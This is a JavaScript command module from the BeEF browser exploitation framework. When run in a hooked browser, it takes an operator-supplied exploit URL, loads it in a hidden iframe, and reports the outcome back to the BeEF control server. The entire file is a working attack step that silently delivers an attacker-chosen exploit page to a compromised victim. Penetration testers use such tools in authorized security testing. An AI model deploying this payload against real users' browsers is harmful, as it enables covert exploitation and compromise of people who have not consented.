//
// Copyright (c) 2006-2018 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
	var url = '<%= @sploit_url %>';
	if (!/https?:\/\//i.test(url)) {
		beef.net.send("<%= @command_url %>", <%= @command_id %>, "error=invalid url");
		return;
	}
	var sploit = beef.dom.createInvisibleIframe();
        sploit.src = url;
	beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=IFrame Created!");
});
